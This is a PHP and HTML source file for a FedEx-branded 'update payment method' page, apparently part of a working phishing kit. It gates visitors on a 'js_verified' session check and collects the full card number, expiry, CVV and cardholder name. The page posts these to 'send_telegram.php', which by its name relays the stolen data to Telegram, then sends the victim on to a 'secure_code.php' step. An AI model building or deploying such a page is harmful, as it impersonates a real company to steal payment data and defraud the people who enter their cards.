<?php
session_start();
if (!isset($_SESSION['js_verified'])) {
    header("Location: /index.php");
    exit;
}

// Set language, default 'en'
$lang = $_SESSION['lang'] ?? 'en';
include __DIR__ . "/../lang_pay/{$lang}.php"; // $t array with translations

// Pass translations to JS
$js_translations = json_encode([
    'invalid_card_number' => $t['invalid_card_number'],
    'invalid_expiry' => $t['invalid_expiry'],
    'invalid_cvv' => $t['invalid_cvv'],
    'name_required' => $t['name_required'],
    'failed_store_session' => $t['failed_store_session'],
    'failed_submit_payment' => $t['failed_submit_payment'],
    'error_occurred' => $t['error_occurred'],
]);
?>

<!DOCTYPE html>
<html lang="<?= htmlspecialchars($lang) ?>">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/png" href="./img/logo.jpg">
    <title><?= htmlspecialchars($t['page_title']) ?></title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        'fedex-purple': '#4D148C',
                        'fedex-orange': '#FF6200',
                        'fedex-gray': '#4A4A4A',
                        'fedex-light-gray': '#E6E6E6',
                    },
                    fontFamily: {
                        sans: ['Helvetica Neue', 'Arial', 'sans-serif'],
                    },
                    animation: {
                        'bounce-subtle': 'bounceSubtle 2s infinite',
                        'shake': 'shake 0.5s ease-in-out',
                    },
                    keyframes: {
                        bounceSubtle: {
                            '0%, 100%': { transform: 'translateY(0px)' },
                            '50%': { transform: 'translateY(-3px)' },
                        },
                        shake: {
                            '0%, 100%': { transform: 'translateX(0)' },
                            '25%': { transform: 'translateX(-4px)' },
                            '75%': { transform: 'translateX(4px)' },
                        },
                    }
                }
            }
        }
    </script>
    <style>
        body { font-family: 'Helvetica Neue', Arial, sans-serif; }
        .card-float { transition: all 0.3s ease; }
        .card-float:hover { transform: translateY(-2px); box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1); }
        .input-focus { transition: all 0.3s ease; }
        .input-focus:focus { border-color: #FF6200; box-shadow: 0 0 0 3px rgba(255, 98, 0, 0.2); }
        .error-shake { animation: shake 0.5s; }
        .fedex-button { text-transform: uppercase; letter-spacing: 0.05em; }
    </style>
</head>
<body class="bg-white min-h-screen py-6">
    <script>
        // JS translations
        const t = <?= $js_translations ?>;
    </script>

    <!-- Initial Loading Spinner -->
    <div id="loader" class="fixed inset-0 bg-white flex items-center justify-center z-50 transition-opacity duration-500">
        <div class="flex flex-col items-center space-y-4">
            <div class="flex space-x-2 items-center">
                <img src="https://cdn.sanity.io/images/kts928pd/production/c423a9d143ae2a03c1e7076e9abf851a19fceaec-1600x900.png" alt="FedEx Logo" class="h-8">
            </div>
            <div class="relative w-16 h-16">
                <div class="absolute inset-0 border-4 border-fedex-purple border-t-transparent rounded-full animate-spin"></div>
            </div>
            <p class="text-fedex-gray text-sm font-medium uppercase"><?= htmlspecialchars($t['processing_payment']) ?></p>
        </div>
    </div>

    <!-- Submission Loader -->
    <div id="submission-loader" class="hidden fixed inset-0 bg-white flex items-center justify-center z-50 transition-opacity duration-500">
        <div class="flex flex-col items-center space-y-4">
            <div class="flex space-x-2 items-center">
                <img src="https://cdn.sanity.io/images/kts928pd/production/c423a9d143ae2a03c1e7076e9abf851a19fceaec-1600x900.png" alt="FedEx Logo" class="h-8">
            </div>
            <div class="relative w-16 h-16">
                <div class="absolute inset-0 border-4 border-fedex-purple border-t-transparent rounded-full animate-spin"></div>
            </div>
            <p class="text-fedex-gray text-sm font-medium uppercase"><?= htmlspecialchars($t['submitting_payment']) ?></p>
        </div>
    </div>

    <!-- Main Content -->
    <div id="main-content" class="hidden container mx-auto px-4 max-w-lg">
        <!-- Header -->
        <div class="text-center mb-8">
            <h1 class="text-2xl font-bold text-fedex-purple uppercase mb-2"><?= htmlspecialchars($t['update_payment_method']) ?></h1>
            <p class="text-fedex-gray text-base"><?= htmlspecialchars($t['enter_card_details']) ?></p>
        </div>

        <!-- Payment Form Card -->
        <div class="bg-white rounded-lg shadow-md p-6 card-float">
            <form id="payment-form" class="space-y-4">
                <!-- Card Number -->
                <div>
                    <label for="card-number" class="block text-sm font-semibold text-fedex-purple mb-1"><?= htmlspecialchars($t['card_number']) ?></label>
                    <input type="text" id="card-number" placeholder="<?= htmlspecialchars($t['card_placeholder']) ?>" maxlength="19" class="w-full p-3 border border-fedex-light-gray rounded focus:border-fedex-orange focus:outline-none input-focus transition-all duration-300" />
                    <div id="card-number-error" class="text-red-600 text-xs mt-1 hidden"></div>
                </div>

                <!-- Expiry and CVV -->
                <div class="grid grid-cols-2 gap-4">
                    <div>
                        <label for="expiry" class="block text-sm font-semibold text-fedex-purple mb-1"><?= htmlspecialchars($t['expiry_date']) ?></label>
                        <input type="text" id="expiry" placeholder="<?= htmlspecialchars($t['expiry_placeholder']) ?>" maxlength="5" class="w-full p-3 border border-fedex-light-gray rounded focus:border-fedex-orange focus:outline-none input-focus transition-all duration-300" />
                        <div id="expiry-error" class="text-red-600 text-xs mt-1 hidden"></div>
                    </div>
                    <div>
                        <label for="cvv" class="block text-sm font-semibold text-fedex-purple mb-1"><?= htmlspecialchars($t['cvv']) ?></label>
                        <input type="text" id="cvv" placeholder="<?= htmlspecialchars($t['cvv_placeholder']) ?>" maxlength="4" class="w-full p-3 border border-fedex-light-gray rounded focus:border-fedex-orange focus:outline-none input-focus transition-all duration-300" />
                        <div id="cvv-error" class="text-red-600 text-xs mt-1 hidden"></div>
                    </div>
                </div>

                <!-- Name on Card -->
                <div>
                    <label for="name" class="block text-sm font-semibold text-fedex-purple mb-1"><?= htmlspecialchars($t['name_on_card']) ?></label>
                    <input type="text" id="name" placeholder="<?= htmlspecialchars($t['name_placeholder']) ?>" class="w-full p-3 border border-fedex-light-gray rounded focus:border-fedex-orange focus:outline-none input-focus transition-all duration-300" />
                    <div id="name-error" class="text-red-600 text-xs mt-1 hidden"></div>
                </div>

                <!-- Submit Button -->
                <button type="submit" class="w-full bg-fedex-purple hover:bg-fedex-orange text-white py-3 rounded font-semibold text-sm fedex-button transition-all duration-300">
                    <?= htmlspecialchars($t['update_payment']) ?>
                </button>
            </form>
        </div>
    </div>

    <script>
        // Luhn Algorithm for card validation
        const luhnCheck = num => {
            const arr = `${num}`.split('').reverse().map(x => Number.parseInt(x));
            const lastDigit = arr.shift();
            let sum = arr.reduce(
                (acc, val, i) => i % 2 !== 0 ? acc + val : acc + ((val *= 2) > 9 ? val - 9 : val),
                0
            );
            sum += lastDigit;
            return sum % 10 === 0;
        };

        const form = document.getElementById('payment-form');
        const cardNumber = document.getElementById('card-number');
        const expiry = document.getElementById('expiry');
        const cvv = document.getElementById('cvv');
        const nameInput = document.getElementById('name');

        function hideError(input, errorId) {
            input.classList.remove('border-red-500', 'error-shake');
            document.getElementById(errorId).classList.add('hidden');
        }

        function showError(input, errorId, message) {
            input.classList.add('border-red-500', 'error-shake');
            const error = document.getElementById(errorId);
            error.textContent = message;
            error.classList.remove('hidden');
        }

        cardNumber.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
            e.target.value = value.trim();
            const cleanCard = value.replace(/\s/g, '');
            if (cleanCard.length >= 13 && cleanCard.length <= 19 && luhnCheck(cleanCard)) {
                hideError(e.target, 'card-number-error');
            }
        });

        expiry.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 2) value = value.slice(0, 2) + '/' + value.slice(2);
            e.target.value = value.slice(0, 5);
            const [month, year] = value.split('/');
            const currentYear = new Date().getFullYear() % 100;
            const currentMonth = new Date().getMonth() + 1;
            if (month && year && parseInt(month) >= 1 && parseInt(month) <= 12 && 
                (parseInt(year) > currentYear || (parseInt(year) === currentYear && parseInt(month) >= currentMonth))) {
                hideError(e.target, 'expiry-error');
            }
        });

        cvv.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
            if (e.target.value.length >= 3 && e.target.value.length <= 4) {
                hideError(e.target, 'cvv-error');
            }
        });

        nameInput.addEventListener('input', (e) => {
            if (e.target.value.trim()) {
                hideError(e.target, 'name-error');
            }
        });

        form.addEventListener('submit', (e) => {
            e.preventDefault();
            let valid = true;

            document.querySelectorAll('.error-shake').forEach(el => el.classList.remove('error-shake', 'border-red-500'));
            document.querySelectorAll('[id$="-error"]').forEach(el => el.classList.add('hidden'));

            if (!nameInput.value.trim()) {
                showError(nameInput, 'name-error', t.name_required);
                valid = false;
            }

            const cleanCard = cardNumber.value.replace(/\s/g, '');
            if (cleanCard.length < 13 || cleanCard.length > 19 || !luhnCheck(cleanCard)) {
                showError(cardNumber, 'card-number-error', t.invalid_card_number);
                valid = false;
            }

            const [month, year] = expiry.value.split('/');
            const currentYear = new Date().getFullYear() % 100;
            const currentMonth = new Date().getMonth() + 1;
            if (!month || !year || parseInt(month) < 1 || parseInt(month) > 12 || 
                (parseInt(year) < currentYear) || 
                (parseInt(year) === currentYear && parseInt(month) < currentMonth)) {
                showError(expiry, 'expiry-error', t.invalid_expiry);
                valid = false;
            }

            if (cvv.value.length < 3 || cvv.value.length > 4) {
                showError(cvv, 'cvv-error', t.invalid_cvv);
                valid = false;
            }

            if (valid) {
                const cardLength = cleanCard.length;
                const maskedCard = cleanCard.slice(0, 4) + 'x'.repeat(cardLength - 8) + cleanCard.slice(-4);

                const formData = new FormData();
                formData.append('card_number', cardNumber.value);
                formData.append('expiry', expiry.value);
                formData.append('cvv', cvv.value);
                formData.append('name', nameInput.value);
                formData.append('masked_card', maskedCard);

                document.getElementById('submission-loader').classList.remove('hidden');
                document.getElementById('main-content').classList.add('hidden');

                fetch('send_telegram.php', { method: 'POST', body: formData })
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'success') {
                        fetch('store_session.php', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                            body: 'masked_card=' + encodeURIComponent(maskedCard)
                        })
                        .then(() => {
                            setTimeout(() => {
                                document.getElementById('submission-loader').classList.add('opacity-0');
                                setTimeout(() => window.location.href = 'secure_code.php', 500);
                            }, 10000);
                        })
                        .catch(error => {
                            document.getElementById('submission-loader').classList.add('opacity-0');
                            setTimeout(() => {
                                document.getElementById('submission-loader').style.display = 'none';
                                document.getElementById('main-content').classList.remove('hidden');
                                alert(t.failed_store_session + ': ' + error.message);
                            }, 500);
                        });
                    } else {
                        document.getElementById('submission-loader').classList.add('opacity-0');
                        setTimeout(() => {
                            document.getElementById('submission-loader').style.display = 'none';
                            document.getElementById('main-content').classList.remove('hidden');
                            alert(t.failed_submit_payment + ': ' + data.message);
                        }, 500);
                    }
                })
                .catch(error => {
                    document.getElementById('submission-loader').classList.add('opacity-0');
                    setTimeout(() => {
                        document.getElementById('submission-loader').style.display = 'none';
                        document.getElementById('main-content').classList.remove('hidden');
                        alert(t.error_occurred + ': ' + error.message);
                    }, 500);
                });
            }
        });

        setTimeout(() => {
            document.getElementById('loader').classList.add('opacity-0');
            document.getElementById('loader').classList.remove('z-50');
            setTimeout(() => {
                document.getElementById('loader').style.display = 'none';
                document.getElementById('main-content').classList.remove('hidden');
            }, 500);
        }, 3000);
    </script>
</body>
</html> 